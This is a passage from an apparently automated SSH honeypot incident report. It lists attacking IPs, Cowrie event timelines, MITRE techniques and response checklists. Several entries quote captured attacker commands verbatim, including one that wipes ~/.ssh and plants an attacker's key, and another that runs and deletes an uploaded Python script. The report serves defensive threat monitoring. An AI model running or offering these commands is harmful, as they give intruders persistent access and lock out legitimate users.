- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba446b63649

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-07-15 10:33 |
| **Last Seen** | 2026-07-15 10:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:33:13` | `cowrie.session.connect` |
| `2026-07-15 10:33:13` | `cowrie.client.version` |
| `2026-07-15 10:33:13` | `cowrie.client.kex` |
| `2026-07-15 10:33:15` | `cowrie.login.success` |
| `2026-07-15 10:33:16` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1ab7ce4754

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-07-15 10:33 |
| **Last Seen** | 2026-07-15 10:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:33:26` | `cowrie.session.connect` |
| `2026-07-15 10:33:26` | `cowrie.client.version` |
| `2026-07-15 10:33:26` | `cowrie.client.kex` |
| `2026-07-15 10:33:28` | `cowrie.login.success` |
| `2026-07-15 10:33:29` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e061324c244e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 10:38 |
| **Last Seen** | 2026-07-15 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:38:37` | `cowrie.session.connect` |
| `2026-07-15 10:38:37` | `cowrie.client.version` |
| `2026-07-15 10:38:37` | `cowrie.client.kex` |
| `2026-07-15 10:38:37` | `cowrie.login.success` |
| `2026-07-15 10:38:38` | `cowrie.session.params` |
| `2026-07-15 10:38:38` | `cowrie.command.input` |
| `2026-07-15 10:38:38` | `cowrie.log.closed` |
| `2026-07-15 10:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7053bff6ff6

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-15 10:39 |
| **Last Seen** | 2026-07-15 10:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:39:00` | `cowrie.session.connect` |
| `2026-07-15 10:39:00` | `cowrie.client.version` |
| `2026-07-15 10:39:00` | `cowrie.client.kex` |
| `2026-07-15 10:39:02` | `cowrie.login.success` |
| `2026-07-15 10:39:03` | `cowrie.session.params` |
| `2026-07-15 10:39:03` | `cowrie.command.input` |
| `2026-07-15 10:39:03` | `cowrie.command.failed` |
| `2026-07-15 10:39:04` | `cowrie.log.closed` |
| `2026-07-15 10:39:05` | `cowrie.session.params` |
| `2026-07-15 10:39:05` | `cowrie.command.input` |
| `2026-07-15 10:39:05` | `cowrie.session.file_download` |
| `2026-07-15 10:39:05` | `cowrie.log.closed` |
| `2026-07-15 10:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec40e70e452

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-15 10:39 |
| **Last Seen** | 2026-07-15 10:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:39:05` | `cowrie.session.connect` |
| `2026-07-15 10:39:05` | `cowrie.client.version` |
| `2026-07-15 10:39:06` | `cowrie.client.kex` |
| `2026-07-15 10:39:07` | `cowrie.login.success` |
| `2026-07-15 10:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2f14342d69

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-15 10:39 |
| **Last Seen** | 2026-07-15 10:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:39:08` | `cowrie.session.connect` |
| `2026-07-15 10:39:08` | `cowrie.client.version` |
| `2026-07-15 10:39:08` | `cowrie.client.kex` |
| `2026-07-15 10:39:09` | `cowrie.login.success` |
| `2026-07-15 10:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71d6b3c08298

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:10` | `cowrie.session.connect` |
| `2026-07-15 10:46:10` | `cowrie.client.version` |
| `2026-07-15 10:46:10` | `cowrie.client.kex` |
| `2026-07-15 10:46:10` | `cowrie.login.success` |
| `2026-07-15 10:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190e8e904b8b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:11` | `cowrie.session.connect` |
| `2026-07-15 10:46:11` | `cowrie.client.version` |
| `2026-07-15 10:46:11` | `cowrie.client.kex` |
| `2026-07-15 10:46:11` | `cowrie.login.success` |
| `2026-07-15 10:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed5a5ef4ba4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:12` | `cowrie.session.connect` |
| `2026-07-15 10:46:12` | `cowrie.client.version` |
| `2026-07-15 10:46:12` | `cowrie.client.kex` |
| `2026-07-15 10:46:12` | `cowrie.login.success` |
| `2026-07-15 10:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa50df1781d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:21` | `cowrie.session.connect` |
| `2026-07-15 10:46:21` | `cowrie.client.version` |
| `2026-07-15 10:46:21` | `cowrie.client.kex` |
| `2026-07-15 10:46:21` | `cowrie.login.success` |
| `2026-07-15 10:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042088434e41

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:47 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:54` | `cowrie.session.connect` |
| `2026-07-15 10:46:54` | `cowrie.client.version` |
| `2026-07-15 10:46:54` | `cowrie.client.kex` |
| `2026-07-15 10:46:55` | `cowrie.login.success` |
| `2026-07-15 10:46:56` | `cowrie.session.params` |
| `2026-07-15 10:46:56` | `cowrie.command.input` |
| `2026-07-15 10:46:56` | `cowrie.command.failed` |
| `2026-07-15 10:46:57` | `cowrie.log.closed` |
| `2026-07-15 10:46:58` | `cowrie.session.params` |
| `2026-07-15 10:46:58` | `cowrie.command.input` |
| `2026-07-15 10:46:58` | `cowrie.session.file_download` |
| `2026-07-15 10:46:58` | `cowrie.log.closed` |
| `2026-07-15 10:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1460e84057ab

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-07-15 10:46 |
| **Last Seen** | 2026-07-15 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:46:59` | `cowrie.session.connect` |
| `2026-07-15 10:46:59` | `cowrie.client.version` |
| `2026-07-15 10:46:59` | `cowrie.client.kex` |
| `2026-07-15 10:47:00` | `cowrie.login.success` |
| `2026-07-15 10:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efae080b9de

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]26` |
| **First Seen** | 2026-07-15 10:47 |
| **Last Seen** | 2026-07-15 10:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:47:06` | `cowrie.session.connect` |
| `2026-07-15 10:47:06` | `cowrie.client.version` |
| `2026-07-15 10:47:07` | `cowrie.client.kex` |
| `2026-07-15 10:47:09` | `cowrie.login.success` |
| `2026-07-15 10:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d2bcee79ca0

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-15 10:47 |
| **Last Seen** | 2026-07-15 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:47:21` | `cowrie.session.connect` |
| `2026-07-15 10:47:21` | `cowrie.client.version` |
| `2026-07-15 10:47:21` | `cowrie.client.kex` |
| `2026-07-15 10:47:22` | `cowrie.login.success` |
| `2026-07-15 10:47:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3e3efca164

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-15 10:47 |
| **Last Seen** | 2026-07-15 10:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:47:21` | `cowrie.session.connect` |
| `2026-07-15 10:47:21` | `cowrie.client.version` |
| `2026-07-15 10:47:21` | `cowrie.client.kex` |
| `2026-07-15 10:47:22` | `cowrie.login.success` |
| `2026-07-15 10:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eda4c4a8c8e

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-15 10:47 |
| **Last Seen** | 2026-07-15 10:49 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:47:28` | `cowrie.session.connect` |
| `2026-07-15 10:47:28` | `cowrie.client.version` |
| `2026-07-15 10:47:28` | `cowrie.client.kex` |
| `2026-07-15 10:47:29` | `cowrie.login.success` |
| `2026-07-15 10:47:31` | `cowrie.session.file_upload` |
| `2026-07-15 10:47:32` | `cowrie.session.params` |
| `2026-07-15 10:47:32` | `cowrie.command.input` |
| `2026-07-15 10:47:32` | `cowrie.command.input` |
| `2026-07-15 10:47:32` | `cowrie.command.input` |
| `2026-07-15 10:47:32` | `cowrie.command.failed` |
| `2026-07-15 10:47:32` | `cowrie.log.closed` |
| `2026-07-15 10:47:33` | `cowrie.session.params` |
| `2026-07-15 10:47:33` | `cowrie.command.input` |
| `2026-07-15 10:47:33` | `cowrie.log.closed` |
| `2026-07-15 10:47:34` | `cowrie.session.params` |
| `2026-07-15 10:47:34` | `cowrie.command.input` |
| `2026-07-15 10:47:34` | `cowrie.log.closed` |
| `2026-07-15 10:47:35` | `cowrie.session.params` |
| `2026-07-15 10:47:35` | `cowrie.command.input` |
| `2026-07-15 10:47:35` | `cowrie.command.failed` |
| `2026-07-15 10:47:35` | `cowrie.command.failed` |
| `2026-07-15 10:48:37` | `cowrie.session.params` |
| `2026-07-15 10:48:37` | `cowrie.command.input` |
| `2026-07-15 10:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85480a6897e8

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-15 10:49 |
| **Last Seen** | 2026-07-15 10:51 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:49:37` | `cowrie.session.connect` |
| `2026-07-15 10:49:37` | `cowrie.client.version` |
| `2026-07-15 10:49:37` | `cowrie.client.kex` |
| `2026-07-15 10:49:38` | `cowrie.login.success` |
| `2026-07-15 10:49:40` | `cowrie.session.file_upload` |
| `2026-07-15 10:49:41` | `cowrie.session.params` |
| `2026-07-15 10:49:41` | `cowrie.command.input` |
| `2026-07-15 10:49:41` | `cowrie.command.input` |
| `2026-07-15 10:49:41` | `cowrie.command.input` |
| `2026-07-15 10:49:41` | `cowrie.command.failed` |
| `2026-07-15 10:49:41` | `cowrie.log.closed` |
| `2026-07-15 10:49:42` | `cowrie.session.params` |
| `2026-07-15 10:49:42` | `cowrie.command.input` |
| `2026-07-15 10:49:42` | `cowrie.log.closed` |
| `2026-07-15 10:49:43` | `cowrie.session.params` |
| `2026-07-15 10:49:43` | `cowrie.command.input` |
| `2026-07-15 10:49:44` | `cowrie.log.closed` |
| `2026-07-15 10:49:45` | `cowrie.session.params` |
| `2026-07-15 10:49:45` | `cowrie.command.input` |
| `2026-07-15 10:49:45` | `cowrie.command.failed` |
| `2026-07-15 10:49:45` | `cowrie.command.failed` |
| `2026-07-15 10:50:46` | `cowrie.session.params` |
| `2026-07-15 10:50:46` | `cowrie.command.input` |
| `2026-07-15 10:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5814cf1d8724

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-07-15 10:51 |
| **Last Seen** | 2026-07-15 10:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:51:20` | `cowrie.session.connect` |
| `2026-07-15 10:51:20` | `cowrie.client.version` |
| `2026-07-15 10:51:20` | `cowrie.client.kex` |
| `2026-07-15 10:51:21` | `cowrie.login.success` |
| `2026-07-15 10:51:22` | `cowrie.session.params` |
| `2026-07-15 10:51:22` | `cowrie.command.input` |
| `2026-07-15 10:51:22` | `cowrie.command.failed` |
| `2026-07-15 10:51:23` | `cowrie.log.closed` |
| `2026-07-15 10:51:23` | `cowrie.session.params` |
| `2026-07-15 10:51:23` | `cowrie.command.input` |
| `2026-07-15 10:51:24` | `cowrie.session.file_download` |
| `2026-07-15 10:51:24` | `cowrie.log.closed` |
| `2026-07-15 10:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9aff801f9e

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-07-15 10:51 |
| **Last Seen** | 2026-07-15 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:51:24` | `cowrie.session.connect` |
| `2026-07-15 10:51:24` | `cowrie.client.version` |
| `2026-07-15 10:51:24` | `cowrie.client.kex` |
| `2026-07-15 10:51:25` | `cowrie.login.success` |
| `2026-07-15 10:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f8beea4c9b

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-07-15 10:51 |
| **Last Seen** | 2026-07-15 10:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:51:25` | `cowrie.session.connect` |
| `2026-07-15 10:51:25` | `cowrie.client.version` |
| `2026-07-15 10:51:25` | `cowrie.client.kex` |
| `2026-07-15 10:51:26` | `cowrie.login.success` |
| `2026-07-15 10:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c2f1cfaf37

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 10:55 |
| **Last Seen** | 2026-07-15 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:55:42` | `cowrie.session.connect` |
| `2026-07-15 10:55:42` | `cowrie.client.version` |
| `2026-07-15 10:55:42` | `cowrie.client.kex` |
| `2026-07-15 10:55:43` | `cowrie.login.success` |
| `2026-07-15 10:55:43` | `cowrie.session.params` |
| `2026-07-15 10:55:43` | `cowrie.command.input` |
| `2026-07-15 10:55:44` | `cowrie.log.closed` |
| `2026-07-15 10:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c389245290ee

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 10:56 |
| **Last Seen** | 2026-07-15 10:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:56:12` | `cowrie.session.connect` |
| `2026-07-15 10:56:12` | `cowrie.client.version` |
| `2026-07-15 10:56:12` | `cowrie.client.kex` |
| `2026-07-15 10:56:13` | `cowrie.login.success` |
| `2026-07-15 10:56:13` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:56:13` | `cowrie.direct-tcpip.data` |
| `2026-07-15 10:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f24d9b45a0c7

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:24` | `cowrie.session.connect` |
| `2026-07-15 10:59:25` | `cowrie.client.version` |
| `2026-07-15 10:59:25` | `cowrie.client.kex` |
| `2026-07-15 10:59:27` | `cowrie.login.success` |
| `2026-07-15 10:59:28` | `cowrie.direct-tcpip.request` |
